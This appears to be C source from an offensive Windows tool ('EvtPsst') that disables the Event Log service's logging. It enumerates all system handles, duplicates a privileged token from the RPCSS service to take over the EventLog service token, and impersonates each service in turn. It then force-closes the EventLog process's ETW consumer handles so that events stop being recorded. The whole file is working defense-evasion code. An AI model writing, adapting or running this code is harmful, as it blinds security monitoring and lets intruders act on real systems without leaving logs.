#include <Windows.h>
#include <stdio.h>
#include "EvtPsst.h"
#include "Tokenstuff.h"
#include "Handlestuff.h"


PSYSTEM_HANDLE_INFORMATION getHandleInfos() {
	HMODULE hmNtdll = NULL;
	_NtQuerySystemInformation pfnNtQuerySysteminformation = NULL;
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

	PVOID pBuffer = NULL;
	ULONG bufferSize = 0;

	PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;


	hmNtdll = GetModuleHandleA("ntdll.dll");
	if (hmNtdll == NULL) {
		printf("[-] Could not get Ntdll Module Handle\n");
		goto exit;
	}
	pfnNtQuerySysteminformation = (_NtQuerySystemInformation)(GetProcAddress(hmNtdll, "NtQuerySystemInformation"));

	do {
		ntStatus = pfnNtQuerySysteminformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pBuffer, bufferSize, &bufferSize);
		if (!NT_SUCCESS(ntStatus)) {
			if (ntStatus == STATUS_INFO_LENGTH_MISMATCH) {
				if (pBuffer != NULL) {
					VirtualFree(pBuffer, 0, MEM_RELEASE);
				}
				pBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
				continue;
			}
			break;
		}
		else {
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)pBuffer;
			break;
		}

	} while (1);

exit:
	if (hmNtdll) {
		CloseHandle(hmNtdll);
	}
	return pHandleInfo;
}






DWORD GetEventLogToken(PSYSTEM_HANDLE_INFORMATION pHandleInfo, DWORD dwPIDRPCSs, DWORD dwPidEventlog, PHANDLE hTokenEvtLog, HANDLE hProcessRPCSsduplicate) {
	DWORD dwownProcessID = 0;
	dwownProcessID = GetCurrentProcessId();

	DWORD dwHandleCount = 0;
	
	BYTE bHandleTypeNumberToken = 0;

	dwHandleCount = pHandleInfo->HandleCount;
	

	//Get Object Type Numbers for Token Handles
	for (DWORD dwCounterHandle = 0; dwCounterHandle < dwHandleCount; dwCounterHandle++) {
		PSYSTEM_HANDLE pSystemHandle = NULL;
		pSystemHandle = &pHandleInfo->Handles[dwCounterHandle];
		if (pSystemHandle->GrantedAccess == (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY) && pSystemHandle->ProcessId == dwownProcessID) {
			bHandleTypeNumberToken = pSystemHandle->ObjectTypeNumber;
			break;
		}
	}
	
	//Get Eventlog Token
	for (DWORD dwCounterHandle = 0; dwCounterHandle < dwHandleCount; dwCounterHandle++) {
		PSYSTEM_HANDLE pSystemHandle = NULL;
		pSystemHandle = &pHandleInfo->Handles[dwCounterHandle];
		if (pSystemHandle->GrantedAccess == 0xf01ff && pSystemHandle->ProcessId == (ULONG)dwPIDRPCSs && pSystemHandle->ObjectTypeNumber == bHandleTypeNumberToken) {
			DWORD dwSuccess = FAIL;
			HANDLE hToken = NULL;
			
			dwSuccess = DuplicateHandle(hProcessRPCSsduplicate, (HANDLE)(pSystemHandle->Handle), GetCurrentProcess(), &hToken, TOKEN_ALL_ACCESS, FALSE, 0);
			if (dwSuccess == FAIL) {
				printf("[-] Could not duplicate token\n");
				continue;
			}
			else {
				dwSuccess = checkTokenGroups(hToken);
				if (dwSuccess == SUCCESS) {
					*hTokenEvtLog = hToken;
					return SUCCESS;
				}
				else {
					if (hToken) {
						CloseHandle(hToken);
					}
					continue;
				}
			}

		}

	}

	
	return FAIL;

}


DWORD BruteForcewithEventLogToken(PSYSTEM_HANDLE_INFORMATION pHandleInfo, HANDLE hTokenEvtLog, HANDLE hTokenRPCSs, DWORD dwPidEventlog, DWORD dwPidRPCSs, HANDLE hProcessRPCSsduplicate, PHANDLE phProcessEventlogduplicatequery) {
	DWORD dwownProcessID = 0;
	dwownProcessID = GetCurrentProcessId();

	DWORD dwHandleCount = 0;

	BYTE bHandleTypeNumberProcess = 0;

	dwHandleCount = pHandleInfo->HandleCount;


	//Get Object Type Numbers for Process Handles
	for (DWORD dwCounterHandle = 0; dwCounterHandle < dwHandleCount; dwCounterHandle++) {
		PSYSTEM_HANDLE pSystemHandle = NULL;
		pSystemHandle = &pHandleInfo->Handles[dwCounterHandle];
		if (pSystemHandle->GrantedAccess == PROCESS_DUP_HANDLE && pSystemHandle->ProcessId == dwownProcessID) {
			bHandleTypeNumberProcess = pSystemHandle->ObjectTypeNumber;
			break;
		}
	}
	//Get Eventlog Process
	for (DWORD dwCounterHandle = 0; dwCounterHandle < dwHandleCount; dwCounterHandle++) {
		PSYSTEM_HANDLE pSystemHandle = NULL;
		pSystemHandle = &pHandleInfo->Handles[dwCounterHandle];
		if (pSystemHandle->GrantedAccess == SYNCHRONIZE && pSystemHandle->ProcessId == (ULONG)dwPidRPCSs && pSystemHandle->ObjectTypeNumber == bHandleTypeNumberProcess) {
			DWORD dwSuccess = FAIL;

			HANDLE hProcessRemote = NULL;
			hProcessRemote= (HANDLE)pSystemHandle->Handle;
			HANDLE hProcesssynchronize = NULL;
			dwSuccess = RevertToSelf();
			if (dwSuccess == FAIL) {
				printf("[-] Could not Revert the Token\n");
			}
			dwSuccess = ImpersonateLoggedOnUser(hTokenRPCSs);
			if (dwSuccess == FAIL) {
				printf("[-] Could not Impersonate RPCSs Token\n");
			}
			dwSuccess = DuplicateHandle(hProcessRPCSsduplicate, hProcessRemote, GetCurrentProcess(), &hProcesssynchronize, SYNCHRONIZE, FALSE, 0);
			if (dwSuccess == FAIL) {
				printf("[-] Could not duplicate process handle\n");
				continue;
			}
			else {
				dwSuccess = RevertToSelf();
				if (dwSuccess == FAIL) {
					printf("[-] Could not Impersonate RPCSs Token\n");
				}
				dwSuccess = ImpersonateLoggedOnUser(hTokenEvtLog);
				if (dwSuccess == FAIL) {
					printf("[-] Could not Impersonate EventLog Token\n");
				}
				HANDLE hProcessqueryduplicate = NULL;
				dwSuccess = DuplicateHandle(GetCurrentProcess(), hProcesssynchronize, GetCurrentProcess(), &hProcessqueryduplicate, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, 0);
				if (dwSuccess == FAIL){
					//Wrong Process, cleanup and move to the next
					CloseHandle(hProcesssynchronize);
				}
				else{
					if (dwPidEventlog == GetProcessId(hProcessqueryduplicate)) {
						CloseHandle(hProcesssynchronize);
						*phProcessEventlogduplicatequery = hProcessqueryduplicate;
						return SUCCESS;
					}
					else {
						CloseHandle(hProcessqueryduplicate);
						CloseHandle(hProcesssynchronize);
					}
				}

		}

	}


}


	return FAIL;

}



DWORD CloseETWConsumerHandle(PSYSTEM_HANDLE_INFORMATION pHandleInfo, DWORD dwPidEventlog, HANDLE hTokenEvtLog, HANDLE hProcessEventlogduplicatequery) {
	DWORD dwSuccess = FAIL;
	DWORD dwSuccessfull = 0;
	DWORD dwtotal = 0;

	DWORD dwHandleCount = 0;

	dwHandleCount = pHandleInfo->HandleCount;


	//We need only the Eventlog token for the handle duplication from the eventlog process
	dwSuccess = ImpersonateLoggedOnUser(hTokenEvtLog);
	if (dwSuccess == FAIL) {
		printf("[-] Could not Impersonate EventLog Token\n");
	}
	


	//Get ETW Consumer Handles
	for (DWORD dwCounterHandle = 0; dwCounterHandle < dwHandleCount; dwCounterHandle++) {
		PSYSTEM_HANDLE pSystemHandle = NULL;
		pSystemHandle = &pHandleInfo->Handles[dwCounterHandle];
		if (pSystemHandle->GrantedAccess == (ACCESS_MASK)0x400 && pSystemHandle->ProcessId == (ULONG)dwPidEventlog) {
			DWORD dwSuccess = FAIL;
			HANDLE hEtwConsumer = NULL;
			dwtotal++;
			//Kills ETW Consumer Handles
			dwSuccess = DuplicateHandle(hProcessEventlogduplicatequery, (HANDLE)(pSystemHandle->Handle), GetCurrentProcess(), &hEtwConsumer, 0x400, FALSE, DUPLICATE_CLOSE_SOURCE);
			//Althought it says request not supported, it works ;)
			if (GetLastError() == 50) {
				dwSuccess = SUCCESS;
			}
			if (dwSuccess == FAIL) {
				printf("[-] Could not close ETW Consumer Handle: %x\n", pSystemHandle->Handle);
			}
			else {
				dwSuccessfull++;
				printf("[+] Successfully closed ETW Consumer Handle: %x\n", pSystemHandle->Handle);
				CloseHandle(hEtwConsumer);		
			}


		}

	}
	if (dwtotal == 0) {
		return FAIL;
	}
	if (dwtotal == dwSuccessfull) {
		return SUCCESS;
	}


	return FAIL;;
}